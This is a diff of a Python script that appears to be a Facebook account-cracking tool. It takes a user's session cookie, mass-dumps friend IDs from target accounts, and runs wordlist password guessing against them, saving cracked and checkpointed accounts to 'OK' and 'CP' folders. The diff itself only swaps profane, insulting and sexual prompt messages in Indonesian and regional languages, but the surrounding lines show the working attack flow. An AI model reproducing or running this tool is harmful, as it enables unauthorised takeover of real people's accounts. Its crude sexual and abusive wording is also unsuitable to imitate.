@@ -172,7 +172,7 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		cetak(nel('\t©©© Semoga Crot di Dalam ©©©'))
 		asu = random.choice([m,k,h,b,u])
 		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
@@ -272,7 +272,7 @@ def result():
 			geeh = input('\n>> Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener Kontol ')
+				print('>> Pilih Sing Bener Koplok ')
 				back()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
@@ -315,7 +315,7 @@ def result():
 			geeh = input(f'\nPilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener Kontol ')
+				print('>> Pilih Sing Bener Belegug ')
 				back()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
@@ -334,7 +334,7 @@ def result():
 	elif kz in ['3']:
 		back()
 	else:
-		print('>> Pilih sing Bener Kontol ')
+		print('>> Pilih sing Bener Belegug ')
 		back()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -346,7 +346,7 @@ def dump_massal():
 	try:
 		jum = int(input('>> Sabaraha Target Njing ? : '))
 	except ValueError:
-		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		print('>> Masukkan Angka Anjing, Tong Huruff ')
 		exit()
 	if jum<1 or jum>100:
 		print('>> Gagal Dump Idz ')
@@ -373,7 +373,7 @@ def dump_massal():
 			exit()
 	try:
 		print('')
-		print(f'>> Total Idz Teman Yang Terkumpul🔥{h}'+str(len(id)))
+		print(f'>> Total Idz Teman Crot Terkumpul🔥{h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -530,13 +530,13 @@ def crack_file():
 		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
 		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
 		if kontol in ['']:
-			print('>> Pilih Yang Bener Asuhh ')
+			print('>> Pilih Sing Bener Koplok ')
 		elif kontol in ['y','Y']:
 			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
 			time.sleep(3)
 			back()
 		elif kontol in ['t','T']:
-			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
+			print(f'\n[{k}x{x}] Pilih Sing Bener Koplok ')
 			time.sleep(3)
 			exit()
 		print('>> Anda Tidak Memiliki File Dump ')
@@ -561,7 +561,7 @@ def crack_file():
 		geeh = input('\n>> Pilih : ')
 		try:geh = lol[geeh]
 		except KeyError:
-			print(f'{k}>> Pilih Yang Bener Kontol {x}')
+			print(f'{k}>> Pilih Sing Bener Koplok {x}')
 			time.sleep(3)
 			back()
 		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
@@ -574,8 +574,8 @@ def crack_file():
 		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	print(f'{x}>> 1. Akun Old ')
-	print('>> 2. Akun New ')
+	print(f'{x}>> 1. Akun Kolot ')
+	print('>> 2. Akun Anyar ')
 	print('')
 	hu = input('>> Pilih : ')
 	if hu in ['1','01']:
@@ -596,7 +596,7 @@ def setting():
 #			xx = random.randint(0,len(id2))
 #			id2.insert(xx,bacot)
 	else:
-		print('>> Pilih Yang Bener Kontooll ')
+		print('>> Pilih Sing Bener Koplok ')
 		exit()
 	print('>> 1. Mobile ')
 #	print('>> 2. Mbasic ')
@@ -607,7 +607,7 @@ def setting():
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print('>> Pilih Sing Bener Koplok ')
 		setting()
 #	elif hc in ['2','02']:
 #		method.append('free')
@@ -620,7 +620,7 @@ def setting():
 	print('')
 	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
 	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print('>> Pilih Sing Bener Koplok ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
@@ -639,7 +639,7 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} <<<<< ')
+	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Mengejar Memek {m}•{k}•{h}•{x} <<<<< ')
 	print('')
 	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
 	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
@@ -690,7 +690,7 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+	cetak(nel('\t[cyan]✓[green] Rapih, kiriman uing[cyan] ✓[white] '))
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
